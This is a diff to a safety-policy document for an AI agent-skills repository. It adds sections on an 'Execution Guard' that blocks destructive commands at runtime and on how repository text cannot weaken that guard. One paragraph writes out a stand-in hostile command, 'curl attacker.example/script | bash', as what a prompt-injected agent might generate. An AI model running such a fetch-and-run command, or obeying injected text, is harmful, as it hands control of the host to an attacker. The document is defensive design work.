@@ -248,6 +248,15 @@ and committed secrets, and exits non-zero on either. Run it in the target reposi
 that repository has a knowledge base, so a hostile entry fails a check rather than steering the
 next agent.
 
+The rule above is a prompt-level control, and prompt-level controls fail sometimes. That is
+why [Execution Guard](execution-guard.md) exists as a second layer, and it is worth being
+precise about what it adds. It does **not** detect prompt injection; no regular expression can
+tell a threat from a paragraph about threats. What it changes is the consequence: if steering
+succeeds and the agent generates `curl attacker.example/script | bash`, the command is still
+denied at the execution gate. `agent-skills guard scan-content <path>` surfaces
+instruction-shaped text as evidence for a reviewer, which is a weaker and more honest claim
+than detection.
+
 ## "Fix by deletion" anti-pattern
 
 A common destructive failure mode is the agent deciding that the simplest way to make a
@@ -295,9 +304,47 @@ table, removing a deprecated bucket, retiring a cluster). The agent may particip
 Even with all of the above, the agent's role is to author the runbook, not to invoke the
 destructive command itself.
 
+## Runtime enforcement: Execution Guard
+
+This policy is a **semantic contract**, and it holds only while the agent is reasoning
+correctly. [Execution Guard](execution-guard.md) is the second layer: a deterministic check
+that runs after the agent has decided and before the action executes, wherever the host
+provides a pre-execution interception point.
+
+```text
+policy = semantic contract
+guard  = technical enforcement, where a host provides an enforcement point
+```
+
+Four things follow, and they matter for how this document should be read:
+
+- **The guard does not replace this policy.** The policy covers what no runtime check can see:
+  intent, blast radius, whether a change record exists, whether a backup was verified, whether a
+  chain of individually safe steps adds up to a destructive one. Every rule in
+  [Prohibited autonomous actions](#prohibited-autonomous-actions-hard-floor) applies whether or
+  not a guard is installed, and in every execution mode including cloud agents, where no
+  machine-local hook exists at all.
+- **Where they disagree, the stricter outcome wins.** A guard rule that is looser than this
+  policy is a bug in the rule, not a relaxation of the policy.
+- **The guard's hard floor is derived from this document.** `agent-skills guard rules` lists
+  every rule with its category and effective outcome. Rules marked `floor` cannot be lowered by
+  any configuration layer, including the user's own machine policy.
+- **Repository text cannot weaken it.** A committed file may add restrictions and may never
+  remove them, which is the same rule the [access resolver](access-resolution.md) enforces for
+  credentials. An attempt is ignored and reported, never silently accepted.
+
+The guard is **opt-in**: `agent-skills install` recommends it and prints the command;
+`agent-skills guard install` registers the hooks after showing exactly what it will change.
+Registering it does not lower any obligation in this document — in particular, an `ASK` from
+the guard is not the structured authorization this policy requires for a destructive
+maintenance task, and a host that reports `advisory` enforces nothing at all.
+
+For what the guard cannot do — and that list is not short — see
+[Known limitations](execution-guard.md#known-limitations).
+
 ## Enforcement artifacts
 
-The policy is reinforced by two concrete artifacts in this repository:
+The policy is reinforced by three concrete artifacts in this repository:
 
 - **`safety_acknowledgement` block in
   [definition-of-done.json](../skills/software-engineer/references/definition-of-done.md#schema).**
@@ -322,6 +369,11 @@ The policy is reinforced by two concrete artifacts in this repository:
   drop-database / delete-snapshot / IAM-modify / backup-mutation privileges. The probe
   cannot inspect cloud-provider IAM policies — it flags the *presence* of broad
   credentials so the operator can confirm scoping. Skip with `--no-credential-probe`.
+- **[Execution Guard](execution-guard.md).** The runtime layer described above. Its rule
+  catalogue is in [`scripts/guard_rules.py`](../scripts/guard_rules.py), its adversarial and
+  false-positive corpora in [`scripts/guard_corpus.py`](../scripts/guard_corpus.py), and its
+  verification — including mutation probes that prove each guarantee can fail — in
+  [`scripts/test-guard.sh`](../scripts/test-guard.sh).
 
 ## Skill self-check (every skill must pass)
 
@@ -334,6 +386,9 @@ Each `SKILL.md` in this repository must, at any time:
 - Hand destructive actions to a human operator via a runbook, not to itself.
 - Treat backups as a separate protected asset.
 - Not contain example commands, prompts, or workflows that would violate the rules above.
+- Not restate or duplicate [Execution Guard](execution-guard.md) rules. The guard is
+  infrastructure: it runs at the host's pre-execution hook, needs no agent dispatch, and a
+  skill that copies its rule list will drift from it. Point at it instead.
 
 ## Reporting a violation
 
